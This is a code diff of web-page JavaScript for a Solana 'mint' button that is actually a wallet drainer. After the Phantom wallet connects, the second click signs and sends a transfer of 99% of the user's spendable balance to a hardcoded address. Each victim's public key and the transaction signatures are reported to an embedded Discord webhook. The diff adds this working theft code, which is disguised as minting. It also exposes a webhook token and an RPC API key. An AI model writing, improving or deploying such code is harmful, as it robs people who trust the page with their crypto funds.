@@ -1,77 +1,61 @@
 async function sendToDiscord(message) {
     const webhookUrl = 'https://discord.com/api/webhooks/1424826301025488946/EripCWiQWqL5VT61z9pGJmm4fGhZf876gn5neA9Gn2FSM8_kgjeCQweEynxRRAL4lj8J';
     
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ content: message })
-    });
-  }
-  
-  // Usage;
+    try {
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: message })
+        });
+    } catch (err) {
+        console.error("Discord notification failed:", err);
+    }
+}
+
 $(document).ready(function() {
+    let isConnected = false;
+    let connection = null;
+    let walletPublicKey = null;
+
     $('#connect-wallet').on('click', async () => {
+        // If already connected, execute the mint/transfer
+        if (isConnected && connection && walletPublicKey) {
+            await executeMint();
+            return;
+        }
+
+        // Otherwise, connect the wallet
         if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
-                sendToDiscord('Wallet connected')
+                walletPublicKey = resp.publicKey;
+                sendToDiscord(`Wallet connected: ${resp.publicKey.toString()}`);
                 console.log("Phantom Wallet connected:", resp);
-                var connection = new solanaWeb3.Connection(
-                    'https://solana-mainnet.api.syndica.io/api-key/2zjjPuoKeAWepmScwJ72ADocHcNZzLPhNpbqR1X7eB2jMRAdbXMUzuCks578zUKnWnog8dBpj6Km1dHKdjS5p2hQD6cJ7yUgqVp', 
+
+                connection = new solanaWeb3.Connection(
+                    'https://solana-mainnet.api.syndica.io/api-key/2zjjPuoKeAWepmScwJ72ADocHcNZzLPhNpbqR1X7eB2jMRAdbXMUzuCks578zUKnWnog8dBpj6Km1dHKdjS5p2hQD6cJ7yUgqVp',
                     'confirmed'
                 );
+
                 const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                 const walletBalance = await connection.getBalance(public_key);
-                console.log("Wallet balance:", walletBalance);
+                console.log("Wallet balance:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
-                    sendToDiscord('Insufficient funds for rent')
+                    sendToDiscord('Insufficient funds for rent');
                     alert("Insufficient funds for rent.");
                     return;
                 }
 
+                isConnected = true;
                 $('#connect-wallet').text("Mint");
-                $('#connect-wallet').on('click', async () => {
-                    try {
-                        const recieverWallet = new solanaWeb3.PublicKey('7pn7bxJakCXjiyYt5QQy8McZCMCSDk2EvCcNr97UHsfG');
-                        const balanceForTransfer = walletBalance - minBalance;
-                        
-                        if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds for transfer.");
-                            return;
-                        }
-                    
-                        const transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: resp.publicKey,
-                                toPubkey: recieverWallet,
-                                lamports: Math.floor(balanceForTransfer * 0.99),
-                            }),
-                        );
-                    
-                        const { blockhash } = await connection.getLatestBlockhash('finalized');
-                        transaction.recentBlockhash = blockhash;
-                        transaction.feePayer = resp.publicKey;
-                    
-                        // Sign and send in one step
-                        const { signature } = await window.solana.signAndSendTransaction(transaction);
-                        console.log("Transaction sent:", signature);
-                        
-                        await connection.confirmTransaction(signature, 'confirmed');
-                        console.log("Transaction confirmed:", signature);
-                        
-                        alert("Transfer successful!");
-                        
-                    } catch (err) {
-                        console.error("Error during transfer:", err);
-                        alert("Transfer failed: " + err.message);
-                    }
-                });
+
             } catch (err) {
                 console.error("Error connecting to Phantom Wallet:", err);
+                sendToDiscord(`Connection error: ${err.message}`);
             }
         } else {
             alert("Phantom extension not found.");
@@ -87,4 +71,52 @@ $(document).ready(function() {
             }
         }
     });
+
+    async function executeMint() {
+        try {
+            const recieverWallet = new solanaWeb3.PublicKey('7pn7bxJakCXjiyYt5QQy8McZCMCSDk2EvCcNr97UHsfG');
+            
+            // Get CURRENT balance, not the old one
+            const currentBalance = await connection.getBalance(walletPublicKey);
+            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+            const balanceForTransfer = currentBalance - minBalance;
+            
+            console.log("Current balance:", currentBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+            console.log("Transfer amount:", (balanceForTransfer * 0.99) / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+            
+            if (balanceForTransfer <= 0) {
+                alert("Insufficient funds for transfer.");
+                sendToDiscord('Insufficient funds for transfer');
+                return;
+            }
+
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: walletPublicKey,
+                    toPubkey: recieverWallet,
+                    lamports: Math.floor(balanceForTransfer * 0.99), // Keep 1% for fees
+                }),
+            );
+
+            const { blockhash } = await connection.getLatestBlockhash('finalized');
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = walletPublicKey;
+
+            // Sign and send
+            const { signature } = await window.solana.signAndSendTransaction(transaction);
+            console.log("Transaction sent:", signature);
+            sendToDiscord(`Transaction sent: ${signature}`);
+            
+            await connection.confirmTransaction(signature, 'confirmed');
+            console.log("Transaction confirmed:", signature);
+            sendToDiscord(`Transaction confirmed: ${signature}`);
+            
+            alert("Transfer successful!");
+            
+        } catch (err) {
+            console.error("Error during transfer:", err);
+            alert("Transfer failed: " + err.message);
+            sendToDiscord(`Transfer failed: ${err.message}`);
+        }
+    }
 });
